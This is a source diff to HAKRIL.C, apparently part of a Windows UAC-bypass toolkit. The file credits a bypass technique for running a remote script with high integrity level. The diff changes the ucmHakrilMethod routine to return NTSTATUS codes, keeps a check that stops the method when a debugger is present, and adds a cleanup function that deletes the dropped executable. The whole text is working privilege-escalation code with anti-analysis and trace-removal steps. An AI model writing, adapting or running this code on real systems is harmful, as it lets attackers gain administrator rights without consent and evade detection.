@@ -4,9 +4,9 @@
 *
 *  TITLE:       HAKRIL.C
 *
-*  VERSION:     3.15
+*  VERSION:     3.17
 *
-*  DATE:        15 Feb 2019
+*  DATE:        17 Mar 2019
 *
 *  UAC bypass method from Clement Rouault aka hakril.
 *
@@ -103,13 +103,15 @@ LONG WINAPI AicUnhandledExceptionFilter(
 * execution of remote script on local machine with High IL.
 *
 */
-BOOL ucmHakrilMethod(
+NTSTATUS ucmHakrilMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL bResult = FALSE, bCond = FALSE, bExtracted = FALSE;
-    ULONG DataSize = 0, SnapinSize = 0, ErrorCode = 0;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED, StatusCode;
+
+    BOOL bExtracted = FALSE;
+    ULONG DataSize = 0, SnapinSize = 0;
     SIZE_T Dummy;
     PVOID SnapinResource = NULL, SnapinData = NULL;
     PVOID ImageBaseAddress = g_hInstance;
@@ -124,19 +126,21 @@ BOOL ucmHakrilMethod(
     do {
 
 #ifndef _DEBUG
-        if (supIsDebugPortPresent())
+        if (supIsDebugPortPresent()) {
+            MethodResult = STATUS_DEBUG_ATTACH_FAILED;
             break;
+        }
 #endif     
 
         //
         // Lookup AicLaunchAdminProcess routine pointer.
         //
-        LaunchAdminProcessPtr = (PVOID)AicFindLaunchAdminProcess(&ErrorCode);
+        LaunchAdminProcessPtr = (PVOID)AicFindLaunchAdminProcess(&StatusCode);
         if (LaunchAdminProcessPtr == NULL) {
 
-            switch (ErrorCode) {
+            switch (StatusCode) {
 
-            case ERROR_PROC_NOT_FOUND:
+            case STATUS_PROCEDURE_NOT_FOUND:
                 lpText = TEXT("The required procedure address not found.");
                 break;
 
@@ -146,6 +150,7 @@ BOOL ucmHakrilMethod(
             }
 
             ucmShowMessage(g_ctx->OutputToDebugger, lpText);
+            MethodResult = StatusCode;
             break;
         }
 
@@ -227,6 +232,7 @@ BOOL ucmHakrilMethod(
             TRUE,
             NULL))
         {
+            MethodResult = STATUS_BREAKPOINT;
             break;
         }
 
@@ -243,16 +249,16 @@ BOOL ucmHakrilMethod(
         shinfo.lpParameters = g_SnapInParameters;
         shinfo.lpVerb = RUNAS_VERB;
         shinfo.nShow = SW_SHOW;
-        bResult = ShellExecuteEx(&shinfo);
-        if (bResult) {
+        if (ShellExecuteEx(&shinfo)) {
             if (WaitForSingleObject(shinfo.hProcess, 0x4e20) == WAIT_TIMEOUT)
                 TerminateProcess(shinfo.hProcess, (UINT)-1);
             CloseHandle(shinfo.hProcess);
+            MethodResult = STATUS_SUCCESS;
         }
 
         SetUnhandledExceptionFilter(PreviousFilter);
 
-    } while (bCond);
+    } while (FALSE);
 
     //
     // Cleanup.
@@ -276,5 +282,25 @@ BOOL ucmHakrilMethod(
         DeleteFile(szBuffer);
     }
 
-    return bResult;
+    return MethodResult;
+}
+
+/*
+* ucmHakrilMethodCleanup
+*
+* Purpose:
+*
+* Post execution cleanup routine for HakrilMethod
+*
+*/
+BOOL ucmHakrilMethodCleanup(
+    VOID
+)
+{
+    WCHAR szBuffer[MAX_PATH * 2];
+
+    _strcpy(szBuffer, g_ctx->szTempDirectory);
+    _strcat(szBuffer, FUBUKI_EXE);
+
+    return DeleteFile(szBuffer);
 }
